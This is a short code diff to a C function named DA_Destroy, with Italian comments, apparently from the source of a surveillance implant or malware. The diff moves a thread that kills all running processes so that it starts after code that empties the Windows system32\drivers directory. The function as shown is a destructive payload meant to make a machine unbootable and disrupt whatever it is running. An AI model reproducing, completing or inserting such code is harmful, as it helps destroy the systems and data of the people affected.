@@ -358,12 +358,6 @@ BOOL WINAPI DA_Destroy(BYTE *isPermanent)
 	static BOOL isRunning = FALSE;
 	DWORD dummy;
 
-	// Lancia un thread che killa tutti i processi
-	if (!isRunning) {
-		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillAllProcess, NULL, 0, &dummy);
-		isRunning = TRUE;
-	}
-
 	// Cancella alcuni file di sistema
 	if (*isPermanent) {
 		WCHAR sys_path[MAX_PATH];
@@ -379,5 +373,12 @@ BOOL WINAPI DA_Destroy(BYTE *isPermanent)
 		StrCatW(sys_path, L"\\system32\\drivers");
 		EmptyDirectory(sys_path);
 	}
+
+	// Lancia un thread che killa tutti i processi
+	if (!isRunning) {
+		HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillAllProcess, NULL, 0, &dummy);
+		isRunning = TRUE;
+	}
+
 	return FALSE;
 }
